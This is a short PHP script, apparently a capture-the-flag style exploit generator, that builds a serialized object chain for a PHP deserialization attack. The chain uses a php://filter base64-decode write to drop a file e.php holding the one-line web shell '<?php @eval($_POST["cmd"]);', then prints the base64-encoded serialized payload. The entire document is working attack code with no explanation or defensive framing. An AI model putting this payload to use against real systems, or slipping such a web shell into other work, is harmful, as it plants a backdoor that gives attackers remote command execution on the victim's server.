<?php
class cls1{
        var $cls;
        var $arr;
        function __construct(){
                $this->cls = new cls2();
                $this->arr = array('fileput'=>'fileput');
        }
}

class cls2{
        var $filename ;
        var $txt;
        function __construct(){
                $this->filename = 'php://filter/write=convert.base64-decode/resource=e.php';
                $this->txt = '<?php @eval($_POST["cmd"]);';
                $this->txt = base64_encode($this->txt);
        }
}

print_r(base64_encode(serialize(new cls1())));